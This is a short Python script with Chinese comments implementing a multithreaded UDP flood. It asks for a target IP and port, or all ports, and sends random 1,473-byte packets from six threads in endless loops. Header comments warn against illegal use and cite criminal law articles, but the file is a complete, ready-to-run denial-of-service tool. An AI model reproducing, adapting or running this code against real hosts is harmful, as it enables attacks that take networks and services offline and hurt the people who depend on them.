#coding='utf-8'
import socket#套接字模块
from threading import Thread#线程模块
from random import choice#使用choice创建随机字符


#使用前请注意！！！！！！！！！！！！！！！！！！！！！
#未成年人请勿使用！！！！！！！！！！！！！！！！！！！
#请勿非法攻击任何网络！！！！！！！！！！！！！！！！！
#刑法里涉及计算机犯罪的在第285、286、287条,请自行查阅

def udp_attack(ip:str,port:int,port1:int,data_packet:str):#攻击函数
    '''
    参数
    ip为ip地址
    port为端口号
    port2为绑定端口号
    bao为要发送的字符串
    '''
    a=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    a.bind((socket.gethostname(),port1))
    if port==0:
        while 1:
            for i in range(65536):
                a.sendto(data_packet.encode(),(ip,i))
    else:
        while 1:
            a.sendto(data_packet.encode(),(ip,port))

        
def start_attack():#线程函数
    suiji='0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()'
    bao=''
    for i in range(1473):
        lin=choice(suiji)
        bao+=lin
    ip=str(input('请输入要攻击的ip地址\n'))
    port=int(input('请输入要攻击的端口号,为0攻击所有端口\n'))
    for i in range(6):
        try:
            nihao=Thread(target=udp_attack,args=(ip,port,8000+i,bao))#创建一个线程，i+1的意思是不重复绑定端口
            nihao.start()#开始线程
            print('线程%d准备完毕\n'%i,end='')
        except:
            print('线程出错\n',end='')
    print('所有线程发起完毕，攻击中\n',end='')


if __name__=='__main__':
    start_attack()#调用多线程函数
